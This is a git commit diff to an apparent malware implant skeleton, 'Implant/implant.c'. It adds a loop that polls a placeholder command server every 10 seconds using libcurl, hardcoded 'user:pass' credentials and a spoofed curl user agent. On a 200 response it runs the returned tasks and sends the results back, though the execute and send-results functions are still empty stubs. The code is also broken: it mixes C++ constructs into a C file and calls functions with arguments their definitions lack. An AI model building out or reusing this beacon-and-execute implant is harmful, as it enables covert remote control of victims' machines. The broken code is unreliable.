4146474c38249571bb2f195dc4428913ced2bbfb
Addison Baum <70862672+addycb@users.noreply.github.com>
2022-11-27 14:37:37 -0500

    Skeleton code for execute, sendresults, integrating tasks loop

--- Implant/implant.c
+++ Implant/implant.c
@@ -6,41 +6,50 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 #include <string.h>
 #include <curl/curl.h>
 
+#define SERVERNAME "placeholder"
+
 void tasks(){
     while(1){
         sleep(SLEEP);
-        char tasks[]=gettasks();
+        auto curl = curl_easy_init();
+        if (curl) {
+            curl_easy_setopt(curl, CURLOPT_URL, SERVERNAME);
+            curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
+            curl_easy_setopt(curl, CURLOPT_USERPWD, "user:pass");
+            curl_easy_setopt(curl, CURLOPT_USERAGENT, "curl/7.42.0");
+            curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 5L);
+            curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
+            
+            std::string response_string;
+            std::string header_string;
 
-
-
-}
-}
-
-#define SERVERNAME "placeholder"
-char * gettasks(){
-    auto curl = curl_easy_init();
-    if (curl) {
-        curl_easy_setopt(curl, CURLOPT_URL, SERVERNAME);
-        curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
-        curl_easy_setopt(curl, CURLOPT_USERPWD, "user:pass");
-        curl_easy_setopt(curl, CURLOPT_USERAGENT, "curl/7.42.0");
-        curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 5L);
-        curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
-        
-        std::string response_string;
-        std::string header_string;
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeFunction);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
-        curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);
-        long response_code;
-        curl_easy_perform(curl);
-        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
-        curl_easy_cleanup(curl);
-        curl = NULL;
+            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeFunction);
+            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
+            curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);
+            long response_code;
+            curl_easy_perform(curl);
+            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
+            if(response_code==200){
+                char * results=execute(response_string);
+                sendresults(results);
+            }
+            curl_easy_cleanup(curl);
+            curl = NULL;
+        }
     }
-    int response=0;
-    if(response==200):
-        dotasks(response);
+}
+
+char * execute(){
+    //execute, return json of responses
+}
+
+int sendresults(){
+    while(1){
+        sleep(SLEEP);
+        //Send results, check response
+        //If good response break
+    }
+
 }
 
 #define SLEEP 10
